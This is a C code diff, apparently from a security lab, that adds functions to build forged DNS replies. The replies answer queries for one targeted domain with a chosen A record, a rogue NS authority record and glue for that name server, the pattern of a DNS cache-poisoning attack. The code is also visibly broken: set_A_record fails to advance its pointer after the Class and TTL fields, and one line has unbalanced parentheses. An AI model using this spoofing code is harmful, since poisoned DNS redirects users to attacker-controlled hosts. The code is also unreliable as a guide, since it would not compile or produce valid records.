@@ -50,6 +50,7 @@ string get_eth()
 
 }
 
+/*Construct DNS Header and Records. Return the size (Header + Records)*/
 unsigned short construct_dns_reply(char *buffer)
 {
 	struct dnsheader *dns = (struct dnsheader *) buffer;
@@ -65,5 +66,48 @@ unsigned short construct_dns_reply(char *buffer)
 
 	char *p = buffer + 12; // move the pointer to the beginning of DNS data
 
-	
+	if(strstr(p, TARGET_DOMAIN) == NULL){
+		return 0;		//only target one specific domain
+	}
+
+	p += strlen(p) + 1 + 2 + 2; //Skip the Question section (no change)
+
+	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
+	p += set_NS_record(p, TARGET_DOMAIN, 0, NS_SERVER); //Add an NS record (Authority section)
+	p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
+
+	return p - buffer;
+}
+
+/*Construct an "A" record, and return the total size of the record.
+If name is NULL, use the offset parameter to construct the "name" field.
+If name is not NULL, copy it to the "name" field, and ignore the offset parameter.*/
+unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr)
+{
+	char *p = buffer;
+
+	if(name == NULL){
+		*p = 0xC0;
+		p++;
+		*p = offset;
+		p++;
+	} else {
+		strcpy(p, name);
+		p += strlen(name) + 1;
+	}
+
+	*((unsigned short *)p ) = htons(0x0001);	//Record Type
+	p += 2;
+
+	*((unsigned short *)p ) = htons(0x0001);	//Class
+
+	*((unsigned int *)p ) = htonl(0x00002000);	//Time to Live
+
+	*(unsigned short *)p ) = htons(0x0004);		//Data Length
+
+	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
+	p += 4;
+
+	return (p-buffer);
+
 }
